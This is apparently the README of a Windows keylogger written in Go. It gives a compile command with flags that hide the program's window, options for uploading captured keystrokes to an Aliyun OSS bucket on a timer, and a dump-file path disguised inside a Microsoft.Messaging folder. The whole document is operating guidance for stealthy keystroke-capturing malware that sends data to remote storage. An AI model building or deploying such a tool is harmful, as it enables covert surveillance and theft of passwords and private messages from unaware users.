# keylogger

## Download Dependencies

```
go mod download # Use Proxy If you are in China!
```

If you are in China Mainland, please check: https://goproxy.cn/ for golang dependency download proxy setting guide.

## Compile

```
go build -trimpath -ldflags "-s -w -H=windowsgui" key.go
```

Tested only on Windows.

### Usage

Without any runtime params, it will never upload any recorded data.

To prevent Aliyun OSS Access Key from leakage, please use with caution.

```
> keylogger.exe -h

Usage of keylogger.exe:
  -o string
        format: bucketName:accessKeyId:accessKeySecret:endpoint
  -t int
        Upload interval,default: 60min (default 60)
```

## Data

```
C:\Users\<USERNAME>\AppData\Local\Packages\Microsoft.Messaging\360se_dump.tmp
```

### References
https://github.com/mabangde/pentesttools/blob/master/golang/keylogger.go
